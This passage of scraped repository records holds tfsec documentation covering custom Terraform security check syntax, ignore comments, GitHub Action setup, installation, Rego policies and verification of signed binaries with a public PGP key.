acl\n  action: isPresent\n```\n\n##### notPresent\nConversely, the `noPresent` check action passes if the specified block or attribute is not found in the checked block. For example, if you explicitly don't want an `acl` attribute to be present hou can use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"notPresent\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: notPresent\n```\n\n##### isEmpty\nThe `isEmpty` check action passes if the named block or attribute is defined by empty.\nFor example, to check that there are not tags you might use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"tags\",\n  \"action\": \"isEmpty\",\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: isEmpty\n```\n\n##### startsWith\nThe `startsWith` check action passes if the checked attribute string starts with the specified value. For example, to check that `acl` begins with `public` you could use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"startsWith\",\n  \"value\": \"public\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: startsWith\n  value: public\n```\n\n##### endsWith\nThe `endsWith` check action passes if the checked attribute string ends with the specified value. For example, to check that `acl` ends with `read` you could use the following `MatchSpec`;\n\n```json\n\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"endsWith\",\n  \"value\": \"-read\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: endsWith\n  value: -read\n```\n\n##### contains\nThe `contains` check action will change depending on the attribute or block it is applied to. If the check is against a string attribute, it will look for the `MatchSpec` value in the attribute. If the check is against a list, it will pass if the value item can be found in the list.\n\nIf the attribute is an `object` or `map` it will pass if a key can be found that matches the `MatchSpec` value.\n\nFor example, if you want to ensure that the `CostCentre` exists, you might use the following `MatchSpec`;\n\n```json\n\"matchSpec\" : {\n  \"name\": \"tags\",\n  \"action\": \"contains\",\n  \"value\": \"CostCentre\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: tags\n  action: contains\n  value: CostCentre\n```\n\n##### notContains\nThe `notContains` check action will change depending on the attribute or block it is applied to. If the check is against a string attribute, it will look for the `MatchSpec` value in the attribute. If the check is against a list, it will pass if the value item can be found in the list.\n\nIf the attribute is an `object` or `map` it will pass if a key can be found that matches the `MatchSpec` value.\n\nFor example, you want to make sure that an `action` does not contain `kms:*` you might use the following `MatchSpec`:\n\n```json\n\"matchSpec\" : {\n  \"name\": \"action\",\n  \"action\": \"notContains\",\n  \"value\": \"kms:*\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: tags\n  action: notContains\n  value: kms:*\n```\n\n##### onlyContains\nThe `onlyContains` check action ensures that a slice value only contains acceptable values.\n\nFor example. if you want to ensure that the `tags` only contain `CostCentre` and `Environment` you might use the following `MatchSpec`:\n\n```json\n\"matchSpec\" : {\n  \"name\": \"tags\",\n  \"action\": \"onlyContains\",\n  \"value\": [\n    \"Environment:prod\",\n    \"CostCentre:engineering\"\n  ]\n]\n}\n```\n\n```yaml\nmatchSpec:\n  name: tags\n  action: onlyContains\n  value:\n    - Environment:prod\n    - CostCentre:engineering\n```\n\n##### equals \nThe `equals` check action passes if the checked attribute equals specified value. \nThe core primitive types are supported, if the subject attribute is a Boolean, the `MatchSpec` value will attempt to be cast to a Boolean for comparison.\nFor example, to check that `acl` begins with `private` you could use the following `MatchSpec`;\n\n```json\n\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"equals\",\n  \"value\": \"private\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: equals\n  value: private\n```\n\n##### lessThan\nThe `lessThan` check action passes if the checked attribute is numerical and the value is less than the specified value.\nFor example, if you want to ensure that the `cpu_core_count` is less than 8, you might use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"lessThan\",\n  \"value\": 8\n}\n```\n\n```yaml\nmatchSpec:\n  name: cpu_core_count\n  action: lessThan\n  value: 8\n```\n\n##### lessThanOrEqualTo\nThe `lessThanOrEqualTo` check action passes if the checked attribute is numerical and the value is less than or equal to the specified value.\nFor example, if you want to ensure that the `cpu_core_count` is less than or equal to 4, you might use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"lessThanOrEqualTo\",\n  \"value\": 4\n}\n```\n\n```yaml\nmatchSpec:\n  name: cpu_core_count\n  action: lessThanOrEqualTo\n  value: 4\n```\n\n##### greaterThan\nThe `greaterThan` check action passes if the checked attribute is numerical and the value is greater than the specified value.\nFor example, if you want to ensure that the `cpu_core_count` is greater than 2, you might use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"greaterThan\",\n  \"value\": 2\n}\n```\n\n```yaml\nmatchSpec:\n  name: cpu_core_count\n  action: greaterThan\n  value: 2\n```\n\n##### greaterThanOrEqualTo\nThe `greaterThanOrEqualTo` check action passes if the checked attribute is numerical and the value is greater than or equal to the specified value.\nFor example, if you want to ensure that the `cpu_core_count` is greater than or equal to 4, you might use the following `MatchSpec`\n\n```json\n\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"greaterThanOrEqualTo\",\n  \"value\": 4\n}\n```\n\n```yaml\nmatchSpec:\n  name: cpu_core_count\n  action: greaterThanOrEqualTo\n  value: 4\n```\n\n##### regexMatches\nThe `regexMatches` check action passes when the regex is matched to the pattern passed in the value. This is check would generally be used as a top level check to filter whether or not to apply a check.\n\nFor example, this check will ensure that the source attribute of a module matches the supplied regex before continuing with the subMatches. This can be used to ensure that checks are targeted to specific modules.\n\nWhen tackling this specific use case of filtering module blocks by source, the `requiredLabels` should be set to `\"*\"`\n\n```json\n    \"matchSpec\": {\n        \"name\": \"source\",\n        \"action\": \"regexMatches\",\n        \"value\": \"^modules\\\\/.*public_.+bucket$\",\n        \"subMatch\": {\n          \"name\": \"acl\",\n          \"action\": \"equals\",\n          \"value\": \"public-read\"\n        }\n      }\n```\n\n```yaml\nmatchSpec:\n  name: source\n  action: regexMatches\n  value: \"^modules\\\\/.*public_.+bucket$\"\n  subMatch:\n    name: acl\n    action: equals\n    value: public-read\n\n```\n\n##### isAny\nThe `isAny` check action passes when the attribute value can be found in the slice passed as the check value. This check action supports strings and numbers\n\n```json\n\"matchSpec\": {\n  \"name\": \"acl\",\n  \"action\": \"isAny\",\n  \"value\": [\"private\", \"log-delivery-write\"]\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: isAny\n  value:\n  - private\n  - log-delivery-write\n```\n\n##### isNone\nThe `isNone` check action passes when the attribute value cannot be found in the slice passed as the check value. This check action supports strings and numbers\n\n```json\n\"matchSpec\": {\n  \"name\": \"acl\",\n  \"action\": \"isNone\",\n  \"value\": [\"authenticated-read\", \"public-read\"]\n}\n```\n\n```yaml\nmatchSpec:\n  name: acl\n  action: isNone\n  value:\n  - authenticated-read\n  - public-read\n```\n\n##### requiresPresence\nThe `requiresPresence` checks that the resource in `name` is also present in the Terraform code.\n\nIf you wanted to ensure that `aws_vpc_flowlogs` is present if there is a `aws_vpc`, you might use the following `matchSpec`:\n\n```json\n\"matchSpec\" : {\n  \"action\": \"requiresPresence\",\n  \"name\": \"aws_vpc_flowlogs\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: aws_vpc_flowlogs\n  action: requiresPresence\n```\n\n##### and\nThe `and` check action passes when all the blocks provided within `predicateMatchSpec` evaluate to `true`. This action\ncan be combined with `subMatch` to perform composite checks against the contents of nested blocks.\n\nNote that `or` and `and` actions can be nested as many times as needed.\n\nIf you wanted to ensure that `device_name` and `encrypted` are both present in a nested `ebs_block_device` block,\nyou might use the following `matchSpec`:\n\n```json\n\"matchSpec\": {\n  \"action\": \"isPresent\",\n  \"name\": \"ebs_block_device\",\n  \"subMatch\": {\n    \"action\": \"and\",\n    \"predicateMatchSpec\": [\n      {\n        \"action\": \"isPresent\",\n        \"name\": \"device_name\"      \n      },\n      {\n        \"action\": \"isPresent\",\n        \"name\": \"encrypted\"\n      }\n    ]\n  }\n}\n```\n\n```yaml\nmatchSpec:\n  action: isPresent\n  name: ebs_block_device\n  subMatch : \n    action : and\n    predicateMatchSpec :\n      - action : isPresent\n        name : device_name\n      - action : isPresent\n        name : encrypted \n```\n\n##### or\nThe `or` check action passes when at least one of the blocks provided within `predicateMatchSpec` evaluates to `true`.\nThis action can be combined with `subMatch` to perform composite checks against the contents of nested blocks.\n\nNote that `or` and `and` actions can be nested as many times as needed.\n\nIf you want to ensure that `virtualization_type` is assigned to either `hvm` or `paravirtual`, while enforcing\nthat their implicitly linked required attributes are also present, you might use the following `matchSpec`:\n\n```\n\"matchSpec\": {\n  \"action\": \"or\",\n  \"predicateMatchSpec\": [\n    {\n      \"action\": \"and\",\n      \"predicateMatchSpec\": [\n        {\n          \"name\": \"virtualization_type\",\n          \"action\": \"equals\",\n          \"value\": \"hvm\"\n        }\n      ]\n    },\n    {\n      \"action\": \"and\",\n      \"predicateMatchSpec\": [\n        {\n          \"name\": \"virtualization_type\",\n          \"action\": \"equals\",\n          \"value\": \"paravirtual\"\n        },\n        {\n          \"name\": \"image_location\",\n          \"action\": \"isPresent\"\n        },\n        {\n          \"name\": \"kernel_id\",\n          \"action\": \"isPresent\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n```yaml\nmatchSpec:\n  action: or\n  predicateMatchSpec:\n    - action: and\n      predicateMatchSpec:\n        - name: virtualization_type\n          action: equals\n          value: hvm\n        - name: sriov_net_support\n          action: isPresent\n    - action: and\n      predicateMatchSpec:\n        - name: virtualization_type\n          action: equals\n          value: paravirtual\n        - name: image_location\n          action: isPresent\n        - name: kernel_id\n          action: isPresent\n```\n##### not\nThe `not` check action passes when the `predicateMatchSpec` evaluates to `false`.\n\nAs an example, if you want to represent that a `resource` should not be included `inModule` you might use the following `matchSpec`:\n\n```\n\"matchSpec\": {\n  \"action\": \"not\",\n  \"predicateMatchSpec\": [\n    {\n        \"action\": \"inModule\" \n    }\n  ]\n}\n```\n\n```yaml\nmatchSpec:\n  action: not\n  predicateMatchSpec:\n    - action: inModule\n```\n\n## How do I know my JSON is valid?\nWe have provided the `tfsec-checkgen` binary which will validate your check file or help perform tests to ensure that it is valid for use with `tfsec`.\n\n### `tfsec-checkgen validate`\n\nValidates the syntax of a custom check.\n\n```shell script\ngo run ./cmd/tfsec-checkgen validate example/custom/.tfsec/custom_checks.json\n```\n\n### `tfsec-checkgen test-check`\n\nTests custom check against provided test cases. You can pass in multiple `--fail`/`-f`/`--pass`/`-p` flags to perform multiple tests at once on the same custom check.\n\n```shell script\ngo run ./cmd/tfsec-checkgen test-check ./example/cmd_checkgen_test-check/.tfsec/example_tfchecks.json \\\n--fail ./example/cmd_checkgen_test-check/fail.tf \\\n--pass ./example/cmd_checkgen_test-check/pass.tf\n```\n\nAlternatively, you can install the tfsec-checkgen from the [releases page](https://github.com/aquasecurity/tfsec/releases)\n\n## Are there limitations?\nAt the moment, check `MatchSpec` is limited in the number of check types it can perform, these are as shown in the previous table.\n\nCustom defined checks also don't come with the comprehensive tests that the built in ones have. This will be addressed in future releases.\n", "timestamp": "2025-10-24T22:25:28.763029"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/configuration/ignores.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/configuration/ignores.md", "content": "## Ignoring Issues\n\nYou may wish to ignore some issues. If you'd like to do so, you can\nsimply add a comment containing `tfsec:ignore:<rule>` to the offending\nline in your templates. If the problem refers to a block of code, such\nas a multiline string, you can add the comment on the line above the\nblock, by itself.\n\nFor example, to ignore an open security group rule:\n\n```hcl\nresource \"aws_security_group_rule\" \"my-rule\" {\n    type = \"ingress\"\n    cidr_blocks = [\"0.0.0.0/0\"] #tfsec:ignore:aws-vpc-no-public-ingress-sgr\n}\n```\n\n...or...\n\n```hcl\nresource \"aws_security_group_rule\" \"my-rule\" {\n    type = \"ingress\"\n    #tfsec:ignore:aws-vpc-no-public-ingress-sgr\n    cidr_blocks = [\"0.0.0.0/0\"]\n}\n```\n\nIf you're not sure which line to add the comment on, just check the\ntfsec output for the line number of the discovered problem.\n\nYou can ignore multiple rules by concatenating the rules on a single line:\n\n```hcl\n#tfsec:ignore:aws-s3-enable-bucket-encryption tfsec:ignore:aws-s3-enable-bucket-logging\nresource \"aws_s3_bucket\" \"my-bucket\" {\n  bucket = \"foobar\"\n  acl    = \"private\"\n}\n```\n\n### Ignoring Module Issues\n\nIssues within third-party modules cannot be ignored with the above method, as you might not have access to modify the module source code. In this situation you can add ignore rules above the module block where the module is imported, for example:\n\n```hcl\n#tfsec:ignore:AWS052:exp:2022-01-01\nmodule \"db\" {\n  source = \"terraform-aws-modules/rds/aws\"\n  ...\n```\n\n### Expiration Date\nYou can set expiration date for `ignore` with `yyyy-mm-dd` format. This is a useful feature when you want to ensure ignored issue won't be forgotten and should be revisited in the future.\n```\n#tfsec:ignore:aws-s3-enable-bucket-encryption:exp:2022-01-02\n```\nIgnore like this will be active only till `2022-01-02`, after this date it will be deactivated.\n\n### Workspace Ignores\nIgnoring checks can be scoped to a workspace level. If you add the `ws:` declaration to your ignore it will only be honoured for that workspace.\n\n```hcl\n# tfsec:ignore:AWS006:exp:2221-01-02 #tfsec:ignore:AWS018:ws:development\nresource \"aws_security_group_rule\" \"my-rule\" {\n    type        = \"ingress\"\n\t\n    cidr_blocks = [\"0.0.0.0/0\"]\n}\n```\n\nIn the example above, when tfsec is run with the `--workspace` flag set to development, this ignore will be honoured, but otherwise will be disregarded.\n\n```bash\ntfsec --workspaces development .\n```\n\n### Ignoring specific values\n\nWe have recently added support for ignoring based on the value that has been provided. This is particularly relevant when using `for_each` and you want to allow certain values. \n\n```hcl\nlocals {\n  rules = {\n    http = 80\n    https = 443 \n  }\n}\n\n#tfsec:ignore:aws-vpc-no-public-ingress-sgr[from_port=443]\nresource \"aws_security_group_rule\" \"this\" {\n      for_each = local.rules\n      type = \"ingress\"\n      description     = \"test\"\n      from_port       = each.value \n      to_port         = each.value\n      protocol        = \"tcp\"\n      cidr_blocks     = [\"0.0.0.0/0\"]\n\n}\n```\n\nIn the example above, the `aws-vpc-no-public-ingress-sgr` check will fail for `80` but when it creates the rule for `443` the check will pass.\n\nThis feature is experimental - while it works successfully, please raise issues through [GitHub Issues]\n\n[Github Issues]: https://github.com/aquasecurity/tfsec/issues\n\n", "timestamp": "2025-10-24T22:25:28.863591"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/credit.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/credit.md", "content": "# Authors\n\n- [Liam Galvin][liamg] (liamg)\n- [Owen Rumney][owenrumney] (owenrumney)\n\n# Contributors\n\nThanks to all [contributors][contributors]\n\n[liamg]: https://github.com/liamg\n[owenrumney]: https://github.com/owenrumney\n[contributors]: https://github.com/aquasecurity/tfsec/graphs/contributors", "timestamp": "2025-10-24T22:25:28.967394"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/github-actions/github-action.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/github-actions/github-action.md", "content": "---\ntitle: Github Action - Code Scanning\ndescription: Github Action - Code Scanning\nsubtitle: Adding tfsec to your public GitHub project\ndescription: Adding tfsec to your public GitHub project\nauthor: tfsec\ntags: [installation, github action, code scanning, security analysis]\n---\n\n## What is it?\n\nGithub security alerts sit on the `Security` tab in your github project and detail any security issues that have been found.\n\n`tfsec` can enrich this information, annotating the exact areas in the code base for a given branch with the details of the failure and the severity.\n\nWe have provided an action which can be used in your github repo with very little effort.\n\n## Adding the action\n\nGithub Actions make it easy to add functionality; to add an action, go to the `Action` tab to create a new workflow and choose to Set up a workflow yourself.\n\n![Setup a new workflow](../../imgs/newworkflow.png)\n\nPaste in the workflow content below (be sure to check you're using the latest version of the tfsec-sarif-action by checking [here](https://github.com/marketplace/actions/run-tfsec-with-sarif-upload))\n\n```yaml\nname: tfsec\non:\n  push:\n    branches:\n      - main\n  pull_request:\njobs:\n  tfsec:\n    name: tfsec sarif report\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Clone repo\n        uses: actions/checkout@main\n\n      - name: tfsec\n        uses: tfsec/tfsec-sarif-action@master\n        with:\n          sarif_file: tfsec.sarif         \n\n      - name: Upload SARIF file\n        uses: github/codeql-action/upload-sarif@v1\n        with:\n          # Path to SARIF file relative to the root of the repository\n          sarif_file: tfsec.sarif    \n```\n\n## What is this doing?\n\nBasically, this action is starting a new `ubuntu` github action container and checking out the code for either the pull request or the push to [master/main](https://github.com/github/renaming).\n\nOnce the code has been checked out, `tfsec` with process everything in the local path and generate a sarif report.\n\nFinally, the sarif report will be uploaded and the `Security` tab updated with the identified checks. \n\nIt will look something like;\n\n![Code Scanning](../../imgs/codescanning.png)\n\n## Anything else I should know?\n\nIf you have code that is deeper in the github repo, you can use `working_directory` for the action;\n\n```yaml\n{% raw %}\n- name: tfsec\n  uses: tfsec/tfsec-sarif-action@v0.0.3\n  with:\n    working_directory: terraform/relevant\n    sarif_file: tfsec.sarif         \n    github_token: ${{ secrets.GITHUB_TOKEN }}\n{% endraw %}\n```\n\nThis will target the checks to all folders under `terraform/relevant`\n", "timestamp": "2025-10-24T22:25:29.248787"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/github-actions/pr-commenter.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/github-actions/pr-commenter.md", "content": "---\ntitle: Github Action - PR Commenter\ndescription: Github Action - PR Commenter\nsubtitle: Adding tfsec PR commenter to your GitHub project\ndescription: Adding tfsec PR commenter to your GitHub project\nauthor: tfsec\ntags: [installation, github action, PR commenting]\n---\n\n## What is it?\n\nThe PR Commenter action will process a Pull request and add comments to any areas of the change which fail the `tfsec` checks.\n\n## Adding the action\n\n\nTo add the action, add tfsec_pr_commenter.yml into the .github/workflows directory in the root of your Github project.\n\n![Setup a new workflow](../../imgs/newworkflow.png)\n\nThe contents of tfsec_pr_commenter.yml should be;\n\n```yaml\n{% raw %}\nname: tfsec-pr-commenter\non:\n  pull_request:\njobs:\n  tfsec:\n    name: tfsec PR commenter\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Clone repo\n        uses: actions/checkout@master\n\n      - name: tfsec\n        uses: tfsec/tfsec-pr-commenter-action@main\n        with:\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n{% endraw %}\n```\n\n\nOn each pull request and subsequent commit, tfsec will run and add comments to the PR where tfsec has failed.\n\nThe comment will only be added once per transgression.\n\n## Example PR Comment\n\nThe screenshot below demonstrates the comments that can be expected when using the action\n\n![PR Commenter Example](../../imgs/pr_commenter.png)\n", "timestamp": "2025-10-24T22:25:29.355236"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/installation.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/installation.md", "content": "---\ntitle: Installation\ndescription: Installation\nsubtitle: Installing tfsec on your local machine\ndescription: Installing tfsec on your local machine\nauthor: tfsec\ntags: [installation, quickstart]\n---\nInstall with [brew/linuxbrew](https://brew.sh)\n\n\n```bash\nbrew install tfsec\n```\n\nInstall with [Chocolatey](https://chocolatey.org/)\n\n```cmd\nchoco install tfsec\n```\n\nInstall with [Scoop](https://scoop.sh/)\n\n```cmd\nscoop install tfsec\n```\nYou can also grab the binary for your system from the [releases page](https://github.com/aquasecurity/tfsec/releases).\n\nAlternatively, install with Go:\n\n```bash\ngo install github.com/aquasecurity/tfsec/cmd/tfsec@latest\n```\n\n\n\n\n", "timestamp": "2025-10-24T22:25:29.455447"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/quickstart.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/quickstart.md", "content": "## Using as a command line tool\n\nThe easiest way to run `tfsec` is to run it in the directory you want to scan.\n\n```bash\ntfsec\n```\n\n`tfsec` will traverse the directory till it finds a valid [Terraform] file; the directory it finds this file in will be considered to the working directory.\n\nIf you want to run on a specific location, this can be passed as an argument;\n\n```bash\ntfsec ./tf/prod\n```\n\n\nThe exit status will be non-zero if tfsec finds problems, otherwise the exit status will be zero.\n\n\n\n## Use with Docker\n\nAs an alternative to installing and running tfsec on your system, you may\nrun tfsec in a Docker container.\n\nTo run:\n\n```bash\ndocker run --rm -it -v \"$(pwd):/src\" aquasec/tfsec /src\n```\n\n## Using in CI\n\n`tfsec` can be added to any CI pipeline as a command with the exit code dictating if it breaks the build. \n\nWe do provide a [GitHub Action] that will also upload the results to GitHub code scanning UI.\n\n\n## Passing Arguments\n\nThis page only covers the basics of what `tfsec` can do - much more is achievable using the arguments on the [Parameters] page.\n\n\n\n[Terraform]: https://www.terraform.io\n[GitHub Action]: ../github-actions/github-action\n[Parameters]: ../usage\n", "timestamp": "2025-10-24T22:25:29.559432"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/rego/rego.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/rego/rego.md", "content": "---\ntitle: Rego Policies\ndescription: Rego Policies\nsubtitle: Writing Rego Policies\ndescription: Writing Rego Policies\nauthor: tfsec\ntags: [rego, custom, code scanning, security analysis]\n---\n\n_tfsec_ has the capability to apply user-defined [Rego](https://www.openpolicyagent.org/docs/latest/policy-language/) policies.\n\nThis is a useful feature if your organisation needs to implement custom security policies on top of avoid other misconfigurations and enforcing best practice guidelines.\n\n## Example Policy\n\n```rego\npackage custom.aws.s3.no_insecure_buckets\n\nimport data.lib.result\n\ndeny[res] {\n    bucket := input.aws.s3.buckets[_]\n    bucket.name.value == \"insecure-bucket\"\n    msg := \"Bucket name should not be 'insecure-bucket'\"\n    res := result.new(msg, bucket.name)\n}\n```\n\nLet's break this down.\n\nThe _package_ (line #1) must always start with the `custom` namespace in order for _tfsec_ to recognise it. The rest of the package name can be whatever you like, but it's generally a good idea to break things down by cloud provider, service, environment etc.\n\nThe name of the `deny` rule is important. Rule names must either be `deny`, or begin with `deny_` in order to highlight an issue when _tfsec_ runs.\n\nThe `input` variable contains cloud resources organised by provider (e.g _aws_), and then service (e.g. _s3_). You can see what this looks like by running _tfsec_ on your project with the `--print-rego-input` flag. Combining this with the [jq](https://stedolan.github.io/jq/) tool is very helpful:\n\n```console\ntfsec --print-rego-input | jq '.aws.s3.buckets[0].name'\n{\n  \"endline\": 3,\n  \"explicit\": true,\n  \"filepath\": \"/home/liamg/rego-playground/terraform/bucket.tf\",\n  \"managed\": true,\n  \"startline\": 3,\n  \"value\": \"secure-bucket\"\n}\n```\n\nFor more information about the input structure, you can review the entire schema in code form by studying the `state.State` Go struct [defined in the defsec source code](https://github.com/aquasecurity/defsec/blob/master/state/state.go#L18-L28). All property names are converted to lower-case for consistency, to make writing policies easier.\n\nYou may have noticed that the policy checks `bucket.name.value`, instead of just `bucket.name`. This is because the `bucket.name` property contains more than just the _value_ of the property, it also contains various metadata about where this property value was defined, including the filename and line number of the source Terraform file. You can see an example of this metadata in the jq output above.\n\nThe `res` object which is returned should be created with the `result.new()` function. This is the magic that ensures line numbers and file numbers can be reported when a policy fails. The function takes two parameters:\n\n- _msg_ This parameter is a string which explains the specific issue which has been encountered, e.g. `MFA is not enabled for this user`\n- _source_ This parameter is the property or object where the problem was encountered.\n\nIf you are writing a policy which has no meaningful _source_ parameter/object, you can return a simple string from the rule instead.\n\n## Applying Rego Policies\n\nYou can ask _tfsec_ to apply your custom Rego policies by using the `--rego-policy-dir` flag to specify the directory containing your policies. \n\nPolicies will be loaded recursively starting at this directory, and so can be organised using nested subdirectories if desired.\n\nIf this flag is not specified, no local directories will be scanned for rego policies.\n", "timestamp": "2025-10-24T22:25:29.805985"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/signing.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/signing.md", "content": "\n### Verifying signed binaries\n\nAll tfsec binaries are signed with out signing key `D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE`. The steps below detail how to verify the signature of the keys.\n\n\n#### Public Key\n\nThe public key for `signing@tfsec.dev` can be downloaded [here](../assets/signing.asc)\n\n```\n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nmQINBGCmSy4BEAC9IxH3DeV+xeORRypRZe28YYSvDvBZdfer0apm+p1kJFsXM6ns\ndng9PThUihEt11BMtLmlQyPMQ0TsONOjqFaqNEitzNe55MSHxTYkTrnctrF3IKS4\nG35RHcHUctx9j4Cg56eRxU1cb0B/JJdh9HjZtQG9CJB0+WU/UlXOgYn/17ZScS6Q\ntq56SKd+lW5BfTzl+aYdzbrlWh1Ukla7DvydQmxY7XHgfKbLrGJVQdL91opJvXKr\nD1vxDuMpZHSm9lp6G5GXsZIA080QKcD3nSjeeRTxuABDwHD/1OS03iZQtxwjUMRw\nFYFlrcSVap20SXMLAtKRDpWGhAyzI+JUhZQMuRj22jcicEs7CKGXteFMFlgh3RU1\nK4DfQwFT436ywuDCAuu/vAhVwZmLaUlf6YIWnGBYOjHXjas/f1z7ZTe2dHxQfNg4\nxsmefH++I4qRHF+e2ggMGF2JAv8Y7T3+QDkXDiQ/kTJaFvWqoe0A5V+CmdL01giW\nAkCfqtRIEKuF7NSYsekY0HVGwxDGG/gKWfWw0bq+KxsVwk9/KDVBZIRdimqcuJm1\nPIssx5v+V4BIkYWhKNX0rIu5bi9UAXHJJuCEdzHsiWUp+UA6MBv1FNNWdPJoEwkc\nBgmryUFYr7UVb0+9NkII0rYmnwHcuFO9tErqccN+Ru2f920R40J/jH3GMQARAQAB\ntDpUZnNlYyBTaWduaW5nIChDb2RlIHNpZ25pbmcgZm9yIHRmc2VjKSA8c2lnbmlu\nZ0B0ZnNlYy5kZXY+iQJOBBMBCgA4FiEE1msiKj6kwl1dGgl/w0rO+0bsOc4FAmCm\nSy4CGwMFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQw0rO+0bsOc6zRA/+JZUV\nQ4ip9qGt6mMN+bkFm67218F5J/e1EKC9lbf4yuw56Jgz1+MdENUVROdqTxxXPWqX\nXaS0VD4obq/0G83dVgxuMFuW8LM+Uey6adGLn4QPoxt6Y0lRlQJmsP9aicw+rcvf\ndrV34GwUPTEwbIW1AAhTi1hS+9/EsBqzMnIzL6xBsN29bHFiqQlC0bodDwVU7uYc\ntgh6D8W5FKeQkUiHJlZxGpcY7TEMmhcp26tdIWAfUFBDbwqoS/NZy3ZWJ3QLu1WQ\n72u7gD7tR4NoZwYiSGLZBp8Qz3g1a5RNdsN7U63bMhP8LWuvOYNe886DGAD4Olxa\nHkPowUJ3GVd1v7WE02Zu/72YEQB0XL2gy/QclX56gx0jXDBoyQrzdSHXYQzI3Y0Z\nW7T7ETxkvGsWEHkU+20KJKSTEWKVIQN7kKVT9RbMUvYBTex6oFnzDZvOBhbrWxjP\n4ojHHCkhTyffWZ2LKPDueFuzGLdf/F+Di2//Yc5ylYxPF2mBDp0ptUXPOFCN/5o/\nsmBoDBzVU49Rnnw9qOUZ5PLs+HmPT4MMdGJKO1bD7JRA8zKtzIgNE568U5IjbOjV\nWXYhy9QFoQINjkiGBw0TQf7Yb8O0u0EnumXqYEPcyKgJaIhquduQllaoepJa27qR\nZchuaBTiTJwaMIaz5m8MOQsVMfEgU3tDf0RbufG5Ag0EYKZLLgEQAMjL3IEmut/B\nk/FzcMGbvpf/dlIqnNDFsRLYexmhqfU7n5Nm0bWYhYArszBYfvYlZCXOsjmeRnSa\nfR85mw98ZMxR9n87NtgnNdEFnWceJ+3TkTIlcIZsGqCodWaxKW99q0w2z9MQ8Twn\n4ciioKvinw9FE2YdfnPe7gY3DfvvTWurhvssUh3YLIaGMt3KcRtEVsPOnsRNLeLD\nR9T5CGX8H47C/kBxGIPgh6xRf5yxErU7BwiS7BgSSAXwiM3IenuqgeJe4flBggTl\n7zcevsgvBrIPVemRl428fCTtBkykEobNXz/2JT/CzgCYJ27zlzdFe81ENoxR9Ieb\nKyA2EDw41xtjGiHkXsBdavQsikoXqt8PC7sFoIm/b2125fUmDafZ/DVDxLeSjglx\nizWMN1AG9CV7bEgC/f25UmiQb3V2TkM9Uo+Y5g1ZvJTM83mi2cINjQW5WTwV8fiu\nDFf2QTXY/4W0jtU5EvI7N3tH7laFBsXz32hnEGImsyBUApJK0s3FPdBjwEYtNSt9\nFn5JFr0+48uIgvmS+CnKp+KzQ7YRWputbJWO3JFvlzMmCKXKU/ss+PkU6admTvnH\nrm+2qpGWfsmvStsqpgdbivLwujVC1ZyKnv8MkT7pq0iwlyqyAGlYoTkW1JSiCzmd\ns2kE+hqsIr+u8sd07zjoxtvLdUnF1c81ABEBAAGJAjYEGAEKACAWIQTWayIqPqTC\nXV0aCX/DSs77Ruw5zgUCYKZLLgIbDAAKCRDDSs77Ruw5znn2D/9scSun7N7UcXCD\n0WV4F0QNUU+cu6QeDkjFoolXQZeIBRgSpa1r9qfPzQqB03CF/E5kFQz6APpX9nZX\ngjCvBo2oeeSusUY3d4gkGUnhLC+rwiPaQrJFgh6pDli3A78KChADq+JzZaxcDb7m\nLi41jwmfqHdkC0c6LI9QstOcyV2n5u2/HX0tJLGw47w5eEsfhcI5xgw/adBjqpHM\nlEKTJcyJuIY++9PiNmG5algPwAa+0XrgCdLHyHXHHhoFV+5xj29iWpfPlqLLl1eT\nQqnbqpcOupcsFsASiM5zVGZHK6LYuDkk9Ey/TrqcAhxfyl8cXNpdRC7PanHtykvC\nDKa/6fXNJ3MtpQZ+Z+JjoN1PWQP3UqDYhXxizzT6TrT5N72M//bLm0hadPCt+8Wx\nCzlBBxuxlGEhdriYFUtQ/wN7cRR659qZARylfXI5j1mHBlPuIEoSCMkkz/Nj3Bxo\niuzLVVrX0h16N7H2wclTsw2LDf2rPlTIcI5C